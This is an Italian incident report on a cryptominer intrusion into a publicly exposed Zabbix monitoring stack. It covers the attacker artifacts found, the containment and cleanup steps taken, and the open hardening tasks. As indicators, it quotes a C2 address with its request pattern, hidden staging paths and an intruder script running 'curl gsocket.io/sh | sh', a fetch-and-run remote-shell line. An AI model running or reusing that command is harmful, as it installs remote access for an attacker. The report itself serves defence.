# 19 — Incidente mc2 / stack Zabbix: cryptominer da frontend esposto (2026-10-01)

Stato: CONTENUTO e RIPULITO il 01/10/2026 (~17:30-17:45 CEST). Evidenza: `~/incident_20261001_evidence/`
(+ `.tgz` con sha256) su mc2. Questo doc riassume fatti, azioni, e cosa resta da fare.

## Cosa è stato trovato
- **Due processi miner XMRig** dentro il container `zabbix-server` (mc2), figli diretti di
  `zabbix_server` (spawn via esecuzione script lato server):
  - `369156a` (UPX, exe cancellato, ~2,4 GB RSS, 219% CPU, attivo dalle 04:26 UTC);
  - `syslog-ng-b20e5e6b` (XMRig travestito, ~2,4 GB RSS, 127% CPU, dalle 10:44 UTC).
- **Loader `bws`** (ELF, /tmp del container) con **C2 `92.119.178.59`** (HTTP GET `/?a=&h=&t=&p=`).
- Staging nascosti: `.syslog-187170c4/`, `.X11-unix-socket/` (con `.kworker_sys` e `.self`
  tipo-impianto con componente `lpe_core`), `/dev/shm/duet`, `/var/tmp/.bin`, `.wget-hsts`
  (download da github.com il 01/10 10:44 UTC), history ripulita.
- **Watchdog di ri-deploy**: dopo il primo kill dei miner comparivano
  `/dev/shm/.miner_missing_*`/`.miner_redeploy_*` e un processo `bin syslog-helper`.
- **Accesso admin Zabbix dell'intruso**: token API `zz-backup` (creato 22/09 16:05),
  script `test_exec`, `system_check` (`curl gsocket.io/sh | sh`), `zz_a95152` (recon),
  `sw_272550`, `zshell_zkbf3mpa_srv` (backdoor). Azioni web da IP mascherato (docker-proxy).

## Azioni eseguite (in ordine)
1. Evidenza catturata PRIMA di toccare: binari (`/proc/*/exe`), env/cmdline, `.self`,
   `docker diff` server/web, alberi `/tmp`, `/var/lib/zabbix`, dump tabelle chiave DB.
2. Kill dei miner → rilevato re-deploy automatico → **stop dei container `zabbix-web` e
   `zabbix-server`** (contenimento netto).
3. **Porte chiuse**: compose modificato → `127.0.0.1:1080:8080` e `127.0.0.1:10051:10051`
   (prima 0.0.0.0/:: — esposti). L'accesso legittimo passa dai tunnel autossh mc2→MARCODG1
   (endpoint `127.0.0.1` lato mc2), quindi **nulla si è rotto**.
4. **Container ricreati da immagine** (`zabbix-server`, `zabbix-web`): layer di scrittura
   dell'attaccante eliminato (payload sparito, /dev/shm vuoto, nessun miner).
5. **Pulizia Zabbix**: token `zz-backup` eliminato; 5 script intrusi eliminati (restano i
   nostri + default); **password Admin ruotata e verificata**; **tutte le sessioni azzerate**
   (67.622 → 0). `push_metrics.py` e `/tmp/.zbx_cred` aggiornati automaticamente.
6. **polkitd**: RSS anomalo ~4 GB (leak, binario integro) → restart → 11 MB (+4 GB liberati).
7. Sweep host (mc2/MARCODG1/nuvola): nessun accesso anomalo nei log, cron integri, nessun
   file sospetto residuo, nessuna chiave ssh estranea evidente.
8. **fleet/monitor check**: push_metrics OK (42 valori), fabbrica attiva, canary OK.

## Cosa resta da fare (hardening, follow-up)
- [ ] **agent-zero su :50080** è esposto su 0.0.0.0/:: → bind a 127.0.0.1 o tailscale.
- [ ] **smbd 139/445** pubblici → restringere (serve al PC Windows? solo LAN/tailscale).
- [ ] **denaro2.exporter :9100** e **mc2_feeder :5557/:5558** → bind interfaccia interna
      (verificare prima chi li scrape: Prometheus su MARCODG1 via tailscale).
- [ ] nginx :80/:443/:8901 su mc2: rivedere i vhost serviti.
- [ ] Credenziali DB zabbix (`zabbix_db_pass`/`zabbix_root_pass` in compose): ruotare.
- [ ] Aggiornare l'immagine zabbix 7.0 e disabilitare guest/auth deboli; audit periodico
      di script/token/media zabbix.
- [ ] Conservare l'evidenza per ~30 giorni, poi decidere se cancellare.

## Lezione incisa
Gli strumenti di monitoraggio SONO superficie d'attacco: un frontend di monitoring esposto
pubblicamente con credenziali deboli vale una shell sull'host che monitora. Mai bind
`0.0.0.0` per console di amministrazione; accesso solo via tunnel/localhost; audit periodico
di utenti/token/script; le credenziali dei tool interni si ruotano come quelle dei bot.
